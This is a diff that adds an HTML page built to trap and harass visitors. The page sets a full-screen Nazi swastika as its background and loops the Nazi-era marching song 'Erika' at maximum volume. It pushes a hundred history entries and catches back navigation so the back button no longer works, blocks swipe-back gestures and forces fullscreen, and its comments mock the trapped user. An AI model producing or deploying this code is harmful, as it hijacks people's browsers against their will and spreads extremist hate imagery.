@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auf der Heide blüht ein kleines Blümchen...</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden; 
+            font-family: Arial, sans-serif; 
+            background-color: white;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/9/9c/Nazi_Swastika.svg') no-repeat center center fixed; 
+            background-size: cover; 
+            -webkit-background-size: cover; 
+            -moz-background-size: cover; 
+            -o-background-size: cover; 
+        }
+        audio { display: none; }
+    </style>
+</head>
+<body>
+    <audio id="erika" loop autoplay>
+        <source src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Erika_%28Marching_Song_of_the_German_Military%29.ogg" type="audio/ogg">
+        <source src="https://archive.org/download/ERIKA_201803/ERIKA.mp3" type="audio/mpeg"> <!-- Fallback -->
+        Your browser hates fun.
+    </audio>
+    <script>
+        const audio = document.getElementById('erika');
+        
+        // Crank volume to max and play
+        audio.volume = 1.0;
+        audio.play().catch(e => console.log('Autoplay blocked? Tough luck.')); // Fallback: user tap needed, but loop starts anyway
+        
+        // Trap fullscreen on load (request after interaction, but simulate)
+        document.addEventListener('DOMContentLoaded', () => {
+            if (document.fullscreenElement) return;
+            document.documentElement.requestFullscreen().catch(() => {}); // iOS/Android may need tap
+        });
+        
+        // Infinite history push to break back button (HTML5 trick)
+        let historyCount = 0;
+        const trapInterval = setInterval(() => {
+            if (historyCount < 100) { // Stack 'em up
+                history.pushState({page: 'erika'}, '', window.location.href);
+                historyCount++;
+            }
+        }, 100);
+        
+        // Catch back/forward and reload to self
+        window.addEventListener('popstate', (e) => {
+            if (e.state && e.state.page === 'erika') {
+                history.pushState({page: 'erika'}, '', window.location.href);
+                audio.currentTime = 0; // Restart for extra salt
+                audio.play();
+            }
+        });
+        
+        // Prevent swipe-back on mobile (iOS/Android)
+        document.addEventListener('touchstart', (e) => {
+            if (e.touches.length > 1) e.preventDefault(); // Multi-touch block
+        });
+        let touchStartX = 0;
+        document.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; });
+        document.addEventListener('touchend', (e) => {
+            const touchEndX = e.changedTouches[0].screenX;
+            if (touchStartX - touchEndX > 50) { // Swipe left (back)
+                e.preventDefault();
+                history.pushState(null, '', window.location.href);
+                audio.play();
+            }
+        });
+        
+        // Loop fallback if not natively looping
+        audio.addEventListener('ended', () => { audio.play(); });
+        
+        // Orientation change: louder + flash (if possible)
+        window.addEventListener('orientationchange', () => {
+            setTimeout(() => { audio.volume = 1.0; audio.play(); }, 500);
+            document.body.style.backgroundColor = 'red'; // Quick flash over background
+            setTimeout(() => { document.body.style.backgroundColor = 'white'; }, 100);
+        });
+    </script>
+</body>
+</html>
